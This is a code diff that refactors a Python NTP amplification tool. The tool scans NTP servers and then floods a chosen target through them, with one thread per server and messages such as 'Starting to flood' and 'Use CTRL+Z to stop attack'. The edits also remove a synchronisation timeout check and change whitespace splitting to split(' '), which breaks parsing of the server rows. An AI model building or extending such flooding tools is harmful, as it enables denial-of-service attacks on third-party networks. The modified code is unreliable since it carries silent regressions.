@@ -68,12 +68,7 @@ class NTPScanner:
         print_formatted("+", "Restarting ntp daemon...")
         subprocess.run(["systemctl", "restart", "ntp"])
         print_formatted("+", "Synchronizing ntp servers...")
-        if not self.wait_for_sync():
-            raise TimeoutError(
-                "NTP servers failed to synchronize within the time limit."
-            )
         time.sleep(WAIT_FACTOR * len(self.config.pools))
-        print_formatted("+", "NTP servers synchronized.")
 
     def scan(self):
         self.servers.clear()
@@ -85,7 +80,7 @@ class NTPScanner:
                 self.servers.append(refid)
 
     def extract_ipv4_refid(self, row: str):
-        fields = row.split()
+        fields = row.split(" ")
         return fields[2] if len(fields) >= 3 and is_ipv4(fields[2]) else None
 
 
@@ -177,20 +172,19 @@ def read_servers(server_list: str) -> list:
     if not os.path.isfile(server_list):
         print_formatted("-", "Error: server list file does not exist")
         sys.exit(1)
-    with open(server_list, "r") as f:
-        servers = f.read().splitlines()
-    return servers
+
+    with open(server_list, "r") as file:
+        return file.read().splitlines()
 
 
 def ntp_amplify(servers: list, target: str):
     threads = []
     try:
-        print_formatted("+", "Starting to flood: " + target + " ...")
+        print_formatted("+", f"Starting to flood: {target} ...")
         print_formatted("!", "Use CTRL+Z to stop attack")
 
         for server in servers:
-            thread = threading.Thread(target=deny, args=(server, target))
-            thread.daemon = True
+            thread = threading.Thread(target=deny, args=(server, target), daemon=True)
             thread.start()
             threads.append(thread)
 
@@ -204,19 +198,15 @@ def ntp_amplify(servers: list, target: str):
 
 
 def print_formatted(prefix: str, text: str, color: str = "red", attrs: list = []):
-    valid_prefixes = ["+", "!", "-"]
+    valid_prefixes = {"+": "green", "!": "yellow", "-": "red"}
 
     if prefix not in valid_prefixes:
-        raise ValueError("Invalid prefix: " + prefix)
+        raise ValueError(f"Invalid prefix: {prefix}")
 
-    colored_prefix = {
-        "+": colored(prefix, "green", attrs=["bold"]),
-        "!": colored(prefix, "yellow", attrs=["bold"]),
-        "-": colored(prefix, "red", attrs=["bold"]),
-    }
-
+    colored_prefix = colored(prefix, valid_prefixes[prefix], attrs=["bold"])
     colored_text = colored(text, color, attrs=attrs)
-    print("[" + colored_prefix[prefix] + "]" + " " + colored_text)
+
+    print(f"[{colored_prefix}] {colored_text}")
 
 
 def main():
